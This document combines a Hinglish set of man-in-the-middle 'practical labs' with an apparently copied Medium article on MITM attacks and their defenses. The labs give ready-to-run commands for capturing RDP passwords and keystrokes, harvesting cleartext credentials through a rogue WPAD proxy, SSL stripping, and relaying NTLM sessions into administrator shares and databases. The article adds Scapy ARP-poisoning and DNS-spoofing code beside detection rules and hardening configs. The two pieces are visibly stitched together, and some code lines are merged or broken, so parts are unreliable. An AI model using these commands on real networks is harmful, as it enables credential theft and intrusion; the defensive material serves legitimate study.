*🛠️ ==🟠THE MISSING ADVANCED MITM PRACTICAL LABS**==

### **1. RDP Man-in-the-Middle Attack (`pyrdp-mitm`)**

Jab network par admin ya user RDP (Port 3389) se kisi server ko connect karta hai, to attacker beech me baith kar connection intercept karta hai.

 [ Client (Victim) ] ──► [ Attacker (pyrdp-mitm) ] ──► [ Target RDP Server ]

                              │

                              ├── NLA Disabled: PLAINTEXT PASSWORD CAPTURED!

                              ├── NLA Enabled: NetNTLMv2 Hash captured

                              └── Live Keystroke Logging & Screen Recording!

#### **Step-by-Step Practical:**

bash

# 1. ARP Spoofing start karo victim aur RDP server ke beech

sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.10

# 2. Port forwarding rule set karo taaki RDP traffic pyrdp listener par redirect ho

sudo iptables -t nat -A PREROUTING -p tcp --dport 3389 -j REDIRECT --to-port 3389

# 3. Launch pyrdp-mitm

pyrdp-mitm.py 192.168.1.10:3389 -k private_key.pem -c certificate.pem -o /tmp/rdp_loot/

# 4. Result:

# - Agar NLA (Network Level Authentication) disable hai:

#   [+] Credentials captured: Username: Administrator | Password: Password123!

# - Saare keystrokes /tmp/rdp_loot/ me text file me save hote hain.

# - RDP GUI session video file (.mp4) ke format me record ho jata hai!

---

### **2. WPAD Rogue Proxy + Forced Basic Auth (Plaintext Capture)**

Windows browsers by default **WPAD (Web Proxy Auto-Discovery)** dhoondhte hain. Agar attacker fake WPAD serve kare aur authentication type ko **Basic** force kar de, to browser user ke samne login prompt throw karta hai, aur entered password **Plaintext** me attacker ke paas aata hai!

bash

# Responder ko -w (WPAD) aur -F (Force Basic Auth) ke saath run karein:

sudo responder -I eth0 -wFv

# Kya hota hai:

# 1. Victim browser open karta hai (e.g. Chrome / Edge).

# 2. Browser WPAD query bhejta hai -> Responder bolta hai: "Proxy main hoon, authenticate karo".

# 3. -F flag ki wajah se browser Basic Authentication prompt dikhata hai.

# 4. User jaise hi credentials enter karta hai:

#    [HTTP] Cleartext credentials captured:

#    Username: CORP\jdoe | Password: MyRealPassword2026!

---

### **3. HSTS Bypass via SSLstrip+ aur DNS2Proxy**

Modern websites par **HSTS (HTTP Strict Transport Security)** laga hota hai, jisse normal `sslstrip` kaam nahi karta kyunki browser direct `https://` force karta hai.

**HSTS Bypass Mechanism:** Attacker browser ko direct HTTPS se downgrade nahi karta, balki links me se domain name ko subtly change kar deta hai:

- `https://facebook.com` ⟶\longrightarrow⟶ `http://faceboook.com` (ya `http://www.facebook.com` without dot)
- Browser samajhta hai ye naya domain hai jisme HSTS saved nahi hai, aur unencrypted HTTP request bhej deta hai!

bash

# 1. Bettercap me HSTS proxy rule activate karna:

sudo bettercap -iface eth0

# 2. Console me:

set http.proxy.sslstrip true

set net.sniff.verbose true

http.proxy on

arp.spoof on

---

### **4. Interactive SOCKS Relay Proxy (`ntlmrelayx -socks`)**

Agar network par multiple machines par SMB Signing disabled hai, to ek-ek hash crack karne ke bajaye incoming NTLM connection ko **SOCKS Proxy Tunnel** me convert kar liya jata hai:

bash

# 1. Start ntlmrelayx in SOCKS mode:

sudo impacket-ntlmrelayx -tf targets.txt -socks -smb2support

# 2. Victim se authentication aane ke baad console me check karein:

ntlmrelayx> socks

# Protocol   Target          Username                  Port

# --------   --------------  ------------------------  ----

# SMB        192.168.1.100   CORP\ADMINISTRATOR        445

# MSSQL      192.168.1.120   CORP\SQLADMIN             1433

# 3. Ab Proxychains use karke relayed session ke andar live execute karein:

# (Bina password ke victim machine par administrative share browse karein!)

proxychains impacket-smbclient //192.168.1.100/C$ -U "CORP/ADMINISTRATOR"

# MSSQL database me query run karein:

proxychains impacket-mssqlclient CORP/SQLADMIN@192.168.1.120 -windows-auth

---

### **5. Wireshark MITM Detection Filters (Blue Team Reality)**

Network audit ya defence me MITM attack ko pakadne ke liye ye exact filters use hote hain:

| Detection Goal                 | Wireshark Display Filter                                                                | What It Proves                                                                         |
| ------------------------------ | --------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| **ARP Poisoning Detect karna** | `arp.duplicate-address-frame`                                                           | Ek hi IP ke liye do alag-alag MAC address broadcast ho rahe hain (Attacker + Gateway). |
| **Gratuitous ARP Storm**       | `arp.opcode == 2 && eth.dst == ff:ff:ff:ff:ff:ff`                                       | Fake unsolicited ARP replies flood ho rahe hain.                                       |
| **Cleartext HTTP Credentials** | `http.request.method == "POST" && (http contains "password" \| http contains "passwd")` | Network par bina encryption ke credentials flow ho rahe hain.                          |
| **DNS Spoofing Mismatch**      | `dns.flags.response == 1 && dns.count.answers > 1`                                      | Legitimate IP ke sath rogue IP answer return ho raha hai.                              |
# Advanced Technical Analysis of MITM Attacks: Detection Methodologies and Defensive Countermeasures

[

![Okan Yıldız](https://miro.medium.com/v2/resize:fill:64:64/1*N916FWKpbAJPGjc0sZ0dnw.jpeg)





](https://medium.com/@okanyildiz1994?source=post_page---byline--9bc54b8618bf-----------------------------------------)

[Okan Yıldız](https://medium.com/@okanyildiz1994?source=post_page---byline--9bc54b8618bf-----------------------------------------)

Follow

10 min read

·

Mar 14, 2025

[

](https://medium.com/plans?dimension=post_audio_button&postId=9bc54b8618bf&source=upgrade_membership---post_audio_button-------------------------------------------)

## Introduction

Man-in-the-Middle (MITM) attacks represent a sophisticated class of network-based threats that exploit fundamental protocol weaknesses and infrastructure vulnerabilities. As network architectures become increasingly distributed in 2024, threat actors continue to refine MITM techniques to circumvent modern security controls. This technical deep-dive examines the underlying mechanisms of MITM attacks, protocol-specific exploitation techniques, packet-level analysis methodologies, and advanced countermeasures for security professionals.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*jCw8vId92N5VUP5CN1VgxQ.png)

## MITM Attack Fundamentals: Protocol Exploitation

At its core, a Man-in-the-Middle attack involves positioning an adversary’s system within the communication path between two legitimate endpoints. This interception occurs at various OSI layers depending on the specific technique employed.

## OSI Layer-Specific MITM Techniques

&]:odd:bg-bg-500/10">OSI LayerAttack VectorProtocol ExploitedTechnical Mechanism&]:odd:bg-bg-500/10">Layer 2 (Data Link)ARP PoisoningAddress Resolution ProtocolMAC-to-IP mapping manipulation&]:odd:bg-bg-500/10">Layer 3 (Network)ICMP RedirectionInternet Control Message ProtocolForged ICMP redirect messages&]:odd:bg-bg-500/10">Layer 4 (Transport)TCP Session HijackingTransmission Control ProtocolTCP sequence prediction/injection&]:odd:bg-bg-500/10">Layer 5-7 (Session/Application)SSL/TLS InterceptionTLS Handshake ProtocolCertificate substitution, downgrade attacks

## Technical Deep-Dive: ARP Poisoning Mechanics

ARP poisoning exploits the stateless design of the Address Resolution Protocol. The attack leverages the absence of authentication in ARP transactions and the “trust on first use” principle of ARP caching.

## Packet-Level Analysis of ARP Poisoning

A typical ARP poisoning attack involves the following packet sequence:

# Attacker sending gratuitous ARP to victim (claiming to be the gateway)  
Ethernet II, Src: Attacker_MAC, Dst: Broadcast (ff:ff:ff:ff:ff:ff)  
ARP (opcode: request (1), sender MAC: Attacker_MAC, sender IP: Gateway_IP, target MAC: 00:00:00:00:00:00, target IP: Victim_IP)

# Attacker sending gratuitous ARP to gateway (claiming to be the victim)  
Ethernet II, Src: Attacker_MAC, Dst: Broadcast (ff:ff:ff:ff:ff:ff)  
ARP (opcode: request (1), sender MAC: Attacker_MAC, sender IP: Victim_IP, target MAC: 00:00:00:00:00:00, target IP: Gateway_IP)

## ARP Poisoning Implementation Using Scapy

from scapy.all import *  
import time

def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac, attacker_mac):  
    # Create packets for victim (claiming to be the gateway)  
    packet1 = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=attacker_mac)  
      
    # Create packets for gateway (claiming to be the victim)  
    packet2 = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=attacker_mac)  
      
    # Start poisoning  
    while True:  
        try:  
            send(packet1, verbose=False)  
            send(packet2, verbose=False)  
            time.sleep(2)  
        except KeyboardInterrupt:  
            # Restore original ARP tables  
            restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)  
            breakdef restore_arp(gateway_ip, gateway_mac, target_ip, target_mac):  
    # Send correct ARP information to restore tables  
    packet1 = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac)  
    packet2 = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac, hwsrc=target_mac)  
    send(packet1, verbose=False, count=5)  
    send(packet2, verbose=False, count=5)

## Detecting ARP Poisoning Through Packet Analysis

Detection can be implemented by analyzing ARP traffic patterns:

from scapy.all import *

def detect_arp_poisoning(packet):  
    if packet.haslayer(ARP) and packet[ARP].op == 2:  # is-at (response)  
        # Check for multiple MAC addresses associated with same IP  
        try:  
            real_mac = get_mac_address(packet[ARP].psrc)  
            response_mac = packet[ARP].hwsrc  
              
            if real_mac != response_mac:  
                print(f"[!] ARP Poisoning detected: {packet[ARP].psrc} has MAC {real_mac}, but received {response_mac}")  
        except Exception as e:  
            pass# Start sniffing  
sniff(prn=detect_arp_poisoning, filter="arp", store=0)

## DNS Spoofing: Technical Implementation

DNS spoofing attacks manipulate the domain name resolution process. The following example demonstrates a DNS spoofing attack using dnsspoof in conjunction with ARP poisoning:

# Enable IP forwarding to maintain connectivity  
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start ARP poisoning using arpspoof  
arpspoof -i eth0 -t <victim_ip> <gateway_ip> &  
arpspoof -i eth0 -t <gateway_ip> <victim_ip> &# Configure DNS spoofing with dnsspoof  
dnsspoof -i eth0 -f hosts.txt

Where `hosts.txt` contains mappings like:

192.168.1.100 secure-bank.com  
192.168.1.100 *.secure-bank.com

## DNS Response Packet Anatomy in Spoofing Scenarios

During DNS spoofing, the attacker must race to provide a forged response before the legitimate server:

# Legitimate DNS Query  
IP src=Victim, dst=DNS_Server  
UDP src_port=Random, dst_port=53  
DNS QUERY name=secure-bank.com, type=A

# Forged DNS Response (arrives before legitimate one)  
IP src=DNS_Server (spoofed), dst=Victim  
UDP src_port=53, dst_port=Same_Random_Port_From_Query  
DNS RESPONSE name=secure-bank.com, type=A, ttl=3600, data=Attacker_IP

## SSL/TLS Interception: Technical Analysis

## SSL Stripping Attack Mechanics

SSL stripping involves downgrading HTTPS connections to HTTP by intercepting redirects and modifying content:

# Normal HTTPS Upgrade Flow  
[Client] --HTTP Request--> [Server]  
[Server] --HTTP 301/302 (Location: https://...)--> [Client]  
[Client] --HTTPS Request--> [Server]

# SSL Stripping Attack Flow  
[Client] --HTTP Request--> [Attacker] --HTTP Request--> [Server]  
[Server] --HTTP 301/302 (Location: https://...)--> [Attacker]  
[Attacker] --Modified HTTP 200 with HTTP links--> [Client]

## Implementation of SSL Stripping with mitmproxy

# Set up IP forwarding  
sysctl -w net.ipv4.ip_forward=1

# Redirect HTTP traffic to mitmproxy port  
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080# Run mitmproxy in transparent mode with SSL stripping  
mitmproxy --mode transparent --anticache --ssl-insecure --ssl-strip

## Certificate-Based MITM Using mitmproxy

For SSL/TLS interception:

# Generate mitmproxy certificates  
mitmdump

# Configure iptables to redirect HTTPS traffic  
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080# Run mitmproxy transparent mode  
mitmproxy --mode transparent --ssl-insecure

This approach requires the attacker to have a trusted certificate or to compromise the certificate validation process on the target system.

## BGP Hijacking: Infrastructure-Level MITM

BGP hijacking exploits the trust-based routing infrastructure of the Internet by announcing falsified route advertisements.

## Technical Example of a BGP Hijacking Event

# Original legitimate BGP announcement from AS15169 (Google)  
PREFIX: 8.8.8.0/24  
AS_PATH: AS15169

# Malicious BGP announcement  
PREFIX: 8.8.8.0/24  
AS_PATH: AS64496 AS15169  # Attacker AS prepended to path

The malicious announcement claims a more specific route or a shorter AS path, causing traffic to be rerouted through the attacker’s infrastructure.

## Advanced MITM Detection Techniques

## Using tcpdump for ARP Anomaly Detection

# Monitor for duplicate IP addresses with different MAC addresses  
tcpdump -i eth0 -n "arp and ether broadcast"

# Look for unusual frequency of ARP packets  
tcpdump -i eth0 -n "arp" | awk '{print $4}' | sort | uniq -c | sort -nr

## Bro/Zeek Network Security Monitor for SSL/TLS Interception Detection

Create a custom Zeek policy to detect potential TLS interception:

# ssl-mitm-detection.zeek  
@load base/protocols/ssl

module SSL;export {  
    redef enum Notice::Type += {  
        Potential_MITM,  
    };  
}event ssl_established(c: connection) {  
    if (c$ssl?$server_name && c$ssl?$cert) {  
        local common_name = c$ssl$cert$subject$common_name;  
        local server_name = c$ssl$server_name;  
          
        # Check if common name in cert doesn't match or is not a subdomain of server name  
        if (common_name != server_name && !ends_with(server_name, concat(".", common_name))) {  
            NOTICE([  
                $note=Potential_MITM,  
                $msg=fmt("Potential MITM: certificate CN '%s' doesn't match server name '%s'", common_name, server_name),  
                $conn=c  
            ]);  
        }  
    }  
}

## Detecting DNS Poisoning with DNSiff

# Run DNSiff to monitor for suspicious DNS responses  
dnsiff -i eth0 | grep "possiblednspoison"

## Implementing Technical Countermeasures

## Dynamic ARP Inspection (DAI) Configuration on Cisco Switches

! Configure DHCP Snooping  
Switch(config)# ip dhcp snooping  
Switch(config)# ip dhcp snooping vlan 10,20

! Configure DAI  
Switch(config)# ip arp inspection vlan 10,20  
Switch(config)# ip arp inspection validate src-mac dst-mac ip! Configure trusted interfaces  
Switch(config)# interface GigabitEthernet0/1  
Switch(config-if)# ip dhcp snooping trust  
Switch(config-if)# ip arp inspection trust

## Configuring DNSSEC on BIND9 DNS Server

For a zone file:

# Generate zone signing keys  
dnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.com  
dnssec-keygen -f KSK -a RSASHA256 -b 4096 -n ZONE example.com

# Sign the zone  
dnssec-signzone -A -3 $(head -c 16 /dev/random | od -v -t x | head -1 | cut -d' ' -f2- | tr -d ' ') -N INCREMENT -o example.com -t db.example.com

Update named.conf:

zone "example.com" {  
    type master;  
    file "db.example.com.signed";  
    key-directory "/etc/bind/keys";  
    dnssec-enable yes;  
    dnssec-validation yes;  
    auto-dnssec maintain;  
    inline-signing yes;  
};

## Certificate Pinning Implementation in Android

public class PinningSSLSocketFactory extends SSLSocketFactory {  
    private SSLContext sslContext;  
      
    public PinningSSLSocketFactory(KeyStore keyStore) throws NoSuchAlgorithmException, KeyManagementException, KeyStoreException, UnrecoverableKeyException {  
        super();  
          
        TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());  
        tmf.init(keyStore);  
          
        sslContext = SSLContext.getInstance("TLS");  
        sslContext.init(null, tmf.getTrustManagers(), null);  
    }  
      
    @Override  
    public Socket createSocket() throws IOException {  
        return sslContext.getSocketFactory().createSocket();  
    }  
      
    // Implement other required methods...  
}

// Usage  
KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());  
keyStore.load(null, null);// Add your pinned certificate  
Certificate cert = /* Load certificate */;  
keyStore.setCertificateEntry("cert-alias", cert);// Create URL connection with pinning  
URL url = new URL("https://example.com");  
HttpsURLConnection urlConnection = (HttpsURLConnection) url.openConnection();  
urlConnection.setSSLSocketFactory(new PinningSSLSocketFactory(keyStore));

## Public Key Pinning in HTTP Headers (HPKP)

# Add to HTTP response headers  
Public-Key-Pins: pin-sha256="base64-encoded-hash"; pin-sha256="backup-hash"; max-age=5184000; includeSubDomains

## Securing Network Traffic with Perfect Forward Secrecy

## OpenSSL Configuration for Strong TLS with PFS

# In apache2.conf or ssl.conf  
SSLProtocol -ALL +TLSv1.2 +TLSv1.3  
SSLCipherSuite EECDH+AESGCM:EDH+AESGCM:AES256+EECDH:AES256+EDH  
SSLHonorCipherOrder on  
SSLSessionTickets off

# Generate Diffie-Hellman parameters  
openssl dhparam -out /etc/ssl/certs/dhparam.pem 4096# Include DH parameters  
SSLOpenSSLConfCmd DHParameters "/etc/ssl/certs/dhparam.pem"

## WireGuard VPN Configuration for Secure Remote Access

# Server configuration (/etc/wireguard/wg0.conf)  
[Interface]  
PrivateKey = <server-private-key>  
Address = 10.0.0.1/24  
ListenPort = 51820  
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE  
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]  
PublicKey = <client-public-key>  
AllowedIPs = 10.0.0.2/32# Client configuration  
[Interface]  
PrivateKey = <client-private-key>  
Address = 10.0.0.2/24  
DNS = 10.0.0.1[Peer]  
PublicKey = <server-public-key>  
Endpoint = <server-public-ip>:51820  
AllowedIPs = 0.0.0.0/0  
PersistentKeepalive = 25

## Advanced Detection with Machine Learning

## Anomaly Detection Using TensorFlow (Python Implementation)

import tensorflow as tf  
import numpy as np  
from sklearn.preprocessing import StandardScaler

# Create a model for network traffic anomaly detection  
def build_autoencoder(input_dim):  
    # Encoder  
    input_layer = tf.keras.layers.Input(shape=(input_dim,))  
    encoder = tf.keras.layers.Dense(64, activation="relu")(input_layer)  
    encoder = tf.keras.layers.Dense(32, activation="relu")(encoder)  
    encoder = tf.keras.layers.Dense(16, activation="relu")(encoder)  
      
    # Decoder  
    decoder = tf.keras.layers.Dense(32, activation="relu")(encoder)  
    decoder = tf.keras.layers.Dense(64, activation="relu")(decoder)  
    decoder = tf.keras.layers.Dense(input_dim, activation="sigmoid")(decoder)  
      
    # Autoencoder  
    autoencoder = tf.keras.Model(inputs=input_layer, outputs=decoder)  
    autoencoder.compile(optimizer="adam", loss="mean_squared_error")  
      
    return autoencoder# Feature extraction from network traffic  
def extract_features(packets):  
    features = []  
    for pkt in packets:  
        # Extract relevant features (packet size, inter-arrival time, etc.)  
        # This is simplified; real implementation would be more complex  
        feature_vector = [  
            len(pkt),  
            pkt.time - previous_time if previous_time else 0,  
            1 if "ARP" in pkt else 0,  
            1 if "IP" in pkt and pkt["IP"].src == gateway_ip else 0,  
            # More features...  
        ]  
        features.append(feature_vector)  
        previous_time = pkt.time  
      
    return np.array(features)# Train the model on normal traffic  
scaler = StandardScaler()  
normal_features = extract_features(normal_traffic_capture)  
normal_features_scaled = scaler.fit_transform(normal_features)model = build_autoencoder(normal_features.shape[1])  
model.fit(normal_features_scaled, normal_features_scaled, epochs=50, batch_size=32, validation_split=0.2)# Detect anomalies  
def detect_anomalies(packets, threshold=0.1):  
    features = extract_features(packets)  
    scaled_features = scaler.transform(features)  
      
    reconstructed = model.predict(scaled_features)  
    mse = np.mean(np.power(scaled_features - reconstructed, 2), axis=1)  
      
    return mse > threshold

## MITM Attack Prevention Strategies: Technical Implementation

## Implementing Port Security on Switches

! Configure port security on access port  
Switch(config)# interface GigabitEthernet0/1  
Switch(config-if)# switchport mode access  
Switch(config-if)# switchport port-security  
Switch(config-if)# switchport port-security maximum 2  
Switch(config-if)# switchport port-security mac-address sticky  
Switch(config-if)# switchport port-security violation restrict  
Switch(config-if)# spanning-tree bpduguard enable

## Configuring Mutual TLS (mTLS) with Nginx

# Nginx server configuration  
server {  
    listen 443 ssl;  
    server_name example.com;

    # Server certificate  
    ssl_certificate /etc/nginx/ssl/server.crt;  
    ssl_certificate_key /etc/nginx/ssl/server.key;  
      
    # Client certificate verification  
    ssl_client_certificate /etc/nginx/ssl/ca.crt;  
    ssl_verify_client on;  
      
    # Strong TLS configuration  
    ssl_protocols TLSv1.2 TLSv1.3;  
    ssl_prefer_server_ciphers on;  
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';  
    ssl_session_timeout 10m;  
    ssl_session_cache shared:SSL:10m;  
    ssl_session_tickets off;  
      
    # OCSP Stapling  
    ssl_stapling on;  
    ssl_stapling_verify on;  
      
    # HSTS  
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;  
      
    location / {  
        proxy_pass [http://backend;](http://backend;/)  
        proxy_set_header X-SSL-CERT $ssl_client_cert;  
    }  
}

## Implementing Zero Trust Network Access with BeyondCorp-Like Architecture

# Example policy in YAML format for a modern zero trust gateway  
policies:  
  - name: "access-internal-app"  
    sources:  
      - "any"  
    destinations:  
      - "internal-app.example.com"  
    conditions:  
      device:  
        - "managed == true"  
        - "os_updated == true"  
        - "firewall_enabled == true"  
      user:  
        - "mfa_completed == true"  
        - "group in ['engineering', 'operations']"  
      context:  
        - "risk_score < 50"  
        - "location != 'restricted_countries'"  
    actions:  
      allow: true  
      log: true  
      decrypt: true

## Advanced Monitoring and Response

## Snort Rule for Detecting ARP Poisoning

# Detect multiple ARP responses for the same IP  
alert arp any any -> any any (msg:"ARP poisoning detected"; content:"|00 02|"; depth:2; byte_test:1,=,2,6; threshold:type threshold, track by_src, count 3, seconds 60; sid:5000001; rev:1;)

# Detect ARP responses without requests  
alert arp any any -> any any (msg:"Unsolicited ARP reply detected"; content:"|00 02|"; depth:2; byte_test:1,=,2,6; threshold:type threshold, track by_dst, count 5, seconds 10; sid:5000002; rev:1;)

## Creating a Canary Token for MITM Detection

Canary tokens are specially crafted pieces of data that trigger an alert when accessed:

// Embed in a webpage to detect SSL stripping  
function detectSSLStripping() {  
    if (window.location.protocol !== "https:") {  
        // Send alert to security team  
        fetch("https://canary.example.com/alert", {  
            method: "POST",  
            body: JSON.stringify({  
                type: "ssl_stripping_detected",  
                url: window.location.href,  
                user_agent: navigator.userAgent,  
                timestamp: new Date().toISOString()  
            })  
        });  
          
        // Redirect to HTTPS  
        window.location.href = window.location.href.replace("http:", "https:");  
    }  
}

// Execute on page load  
document.addEventListener("DOMContentLoaded", detectSSLStripping);

## Real-World Incident Response Procedure for MITM Attacks

## Incident Response Playbook: MITM Attack Containment

1. IDENTIFICATION:  
   - Analyze network traffic with tcpdump/Wireshark:  
     $ tcpdump -i any -w incident_$(date +%Y%m%d-%H%M%S).pcap  
   - Check for ARP inconsistencies:  
     $ arp -an | sort -t ' ' -k 4  
   - Review logs for certificate warnings:  
     $ grep -r "certificate" /var/log/*

2. CONTAINMENT:  
   - Isolate affected systems:  
     $ iptables -I INPUT -s <suspicious_ip> -j DROP  
     $ iptables -I OUTPUT -d <suspicious_ip> -j DROP  
   - Restore correct ARP mappings:  
     $ arp -s <gateway_ip> <gateway_mac>  
   - Disable affected network segments at switch level:  
     Switch# interface range GigabitEthernet1/0/1-48  
     Switch(config-if-range)# shutdown3. ERADICATION:  
   - Remove rogue devices from network:  
     $ nmap -sP 192.168.1.0/24 # Identify all devices  
     $ for ip in $(arp -an | grep <attacker_mac> | awk '{print $2}' | tr -d '()'); do  
         echo "Suspicious device: $ip with MAC <attacker_mac>"  
       done  
   - Reset affected credentials and sessions  
   - Revoke compromised certificates:  
     $ openssl ca -revoke <compromised_cert.pem> -config openssl.cnf4. RECOVERY:  
   - Deploy static ARP entries for critical systems  
   - Force re-authentication for all users  
   - Implement additional monitoring  
   - Re-enable network segments with enhanced security:  
     Switch# interface range GigabitEthernet1/0/1-48  
     Switch(config-if-range)# no shutdown

## Conclusion

MITM attacks remain a formidable threat vector requiring multilayered technical countermeasures. By understanding the underlying mechanics at the packet and protocol level, security professionals can implement effective detection and prevention mechanisms. The key to successful defense lies in combining strong encryption, certificate validation, network segregation, and continuous monitoring with anomaly detection.

[](https://medium.com/write?source=promotion_paragraph---post_body_banner_home_for_stories_blocks--9bc54b8618bf-----------------------------------------)

Organizations should approach MITM defense holistically, addressing both technical controls and human factors. Regular security assessments specifically targeting MITM vulnerabilities provide crucial validation of defensive measures. As attack techniques evolve, maintaining current knowledge of exploitation methods and countermeasures is essential for security teams.

## Technical References

For security professionals seeking additional technical details:

1. RFC 3971 — SEcure Neighbor Discovery (SEND)
2. RFC 4033–4035 — DNS Security Extensions
3. RFC 8446 — The Transport Layer Security (TLS) Protocol Version 1.3
4. RFC 7469 — Public Key Pinning Extension for HTTP
5. RFC 6797 — HTTP Strict Transport Security (HSTS)
6. RFC 7258 — Pervasive Monitoring Is an Attack
7. Secure Debug: [https://securedebug.com/advanced-mitm-attacks-detection-and-defensive/](https://securedebug.com/advanced-mitm-attacks-detection-and-defensive/)